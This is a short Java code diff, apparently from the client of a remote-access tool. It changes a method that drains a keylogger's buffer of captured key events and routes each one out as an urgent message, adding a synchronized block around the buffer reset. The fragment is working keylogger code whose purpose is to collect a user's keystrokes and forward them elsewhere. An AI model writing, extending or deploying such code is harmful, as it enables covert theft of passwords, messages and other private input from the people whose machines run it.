@@ -32,7 +32,9 @@ public enum ClientCommands {
 
 	public static void flushKeybuffer() {
 		ArrayList<EV_KEvent> buffer = Keylogger.buffer;
-		Keylogger.buffer = new ArrayList<EV_KEvent>();
+		synchronized (Keylogger.buffer) {
+			Keylogger.buffer = new ArrayList<EV_KEvent>();
+		}
 
 		for (EV_KEvent k : buffer) {
 			ClientRouter.route(Message.newBuilder().setUrgent(true).setEvKevent(k));
